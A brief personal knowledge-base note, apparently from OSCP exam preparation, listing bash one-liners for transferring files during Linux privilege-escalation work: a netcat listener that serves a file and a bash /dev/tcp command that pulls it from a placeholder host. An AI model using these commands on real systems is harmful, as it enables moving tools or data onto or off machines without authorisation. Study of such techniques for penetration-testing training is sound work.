# linux enumeration quick commands transfer / download files with just bash

- send
```bash
LPORT=443
nc -lvnp $LPORT < filename
```
- receive
```bash
LHOST=1.2.3.4
LPORT=443
bash -c "cat < /dev/tcp/$LHOST/$LPORT" > filename
```


` zet/20221003150907/README.md `

# Related

- [20221014185808](/zet/20221014185808/README.md) kb file named kb/hacking/priv-esc/enumeration-quick-commands.md
- [20221009005402](/zet/20221009005402/README.md) preparing for the OSCP exam
- [20221003150920](/zet/20221003150920/README.md) linux enumeration quick commands
- ~/kb/hacking/priv-esc/enumeration-quick-commands.md

Tags:

    #command #hacking #privesc #enumeration 
